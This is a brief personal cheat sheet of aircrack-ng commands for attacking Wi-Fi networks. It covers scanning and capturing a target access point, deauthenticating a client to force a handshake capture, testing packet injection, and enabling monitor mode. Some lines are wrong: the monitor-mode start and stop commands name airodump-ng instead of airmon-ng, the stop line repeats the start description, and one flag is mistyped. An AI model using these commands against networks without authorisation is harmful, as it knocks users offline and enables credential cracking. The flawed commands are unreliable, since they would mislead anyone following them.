----------------------------------------------------------------------
wifi hacking
----------------------------------------------------------------------
# identify target network
    `airodump-ng <interface>`
    
# just observer target network on its channel and write to file
    `airodump-ng <interface> --bssid <AP mac> -c <channel number> -w <filename>`
    `-essid <AP name>` if you want to use that
    
# wait for a handshake for deauth one
    
    

    


`airodump-ng <interface> -w <filename>`
    runs on interface and writes to a file
`airodump-ng -d <bssid> -a`
    only shows bssid and associated clients
`aireplay-ng -0 <number> -a <AP mac> -c <client mac> ath0`
    will deauth client from ap a number of times
`aireplay-ng -9 <interface>`
    test for packet injection 
    
    
# set up wireless interface card
`airmon-ng check kill`
    to stop other services 1st

`airodump-ng start <interface>`
    put card into mon mode
    
`airodump-ng stop <interface mon>`
    put card into mon mode
